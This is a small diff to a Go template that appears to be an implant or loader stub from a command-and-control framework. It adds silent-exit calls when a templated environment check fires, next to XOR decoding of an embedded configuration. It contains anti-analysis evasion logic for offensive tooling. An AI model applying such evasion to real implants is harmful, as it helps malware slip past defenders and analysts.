@@ -23,6 +23,7 @@ import (
 	"github.com/iDigitalFlame/xmt/c2/cfg"
 	"github.com/iDigitalFlame/xmt/data/crypto"
 	"github.com/iDigitalFlame/xmt/data/crypto/subtle"
+	"github.com/iDigitalFlame/xmt/device"
 	"github.com/iDigitalFlame/xmt/man"
 )
 
@@ -43,6 +44,7 @@ var k = [...]byte{
 func main() {
 	// NOTE(dij): Only ran if non-CGO or CGO main is called.
 	if $checks {
+		device.GoExit()
 		return
 	}
 	subtle.XorOp(z, k[:])
@@ -56,6 +58,7 @@ func main() {
 func secondary() {
 	// NOTE(dij): Reserved for CGO secondary functions.
 	if $checks {
+		device.GoExit()
 		return
 	}
 	subtle.XorOp(z, k[:])
